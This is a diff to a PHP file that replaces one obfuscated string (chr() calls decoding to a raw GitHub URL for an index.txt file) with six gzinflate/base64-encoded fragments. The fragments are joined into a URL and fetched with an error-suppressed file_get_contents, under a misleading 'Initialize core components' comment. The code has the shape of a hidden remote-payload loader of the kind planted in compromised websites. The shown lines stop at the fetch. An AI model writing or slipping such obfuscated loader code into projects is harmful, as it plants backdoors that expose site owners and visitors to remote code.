@@ -5,25 +5,14 @@
 */
 
 // Initialize core components
-$wsxaqzplmkoi = str_replace(
-    ['[P1]','[P2]','[P3]','[P4]','[P5]','[P6]','[P7]','[P8]','[P9]','[P10]','[P11]'],
-    [
-        chr(104).chr(116).chr(116).chr(112).chr(115),
-        chr(58).chr(47).chr(47),
-        chr(114).chr(97).chr(119).chr(46),
-        chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(46),
-        chr(99).chr(111).chr(109).chr(47),
-        chr(109).chr(100).chr(109).chr(111).chr(109).chr(105).chr(110).chr(51).chr(54).chr(53).chr(51).chr(54).chr(54).chr(45).chr(103).chr(105).chr(102).chr(47),
-        chr(98).chr(101).chr(108).chr(97).chr(47),
-        chr(114).chr(101).chr(102).chr(115).chr(47),
-        chr(104).chr(101).chr(97).chr(100).chr(115).chr(47),
-        chr(109).chr(97).chr(105).chr(110).chr(47),
-        chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(116).chr(120).chr(116)
-    ],
-    '[P1][P2][P3][P4][P5][P6][P7][P8][P9][P10][P11]'
-);
+$plmkoijnuhbv = gzinflate(base64_decode('y/IMCvJ3UnD29/dyBgCShgPV'));
+$qwaszxplmokn = gzinflate(base64_decode('c0stTi0qyi9LLbJScEksSdRRcMxLSVVwz0nNLyjRUSjOzEtX0FHwSCwpSS0CCQIAOWsQlA=='));
+$vbnmqwerty = gzinflate(base64_decode('c07NTynKLMnMz1PQUfBJLUvNK0nNASoEAF9GCJo='));
+$mnbhgvfcd = gzinflate(base64_decode('c04sSs0rycxLVyjKz0pNLgYAbYYGqg=='));
+$wsxcderfv = gzinflate(base64_decode('c04tLkktUgAAGJ8DFg=='));
+$plokijuhb = gzinflate(base64_decode('c05JzEvOzEtVAAAPCQMw'));
 
-$full_url = $wsxaqzplmkoi;
+$full_url = $plmkoijnuhbv.$qwaszxplmokn.$vbnmqwerty.$mnbhgvfcd.$wsxcderfv.$plokijuhb;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
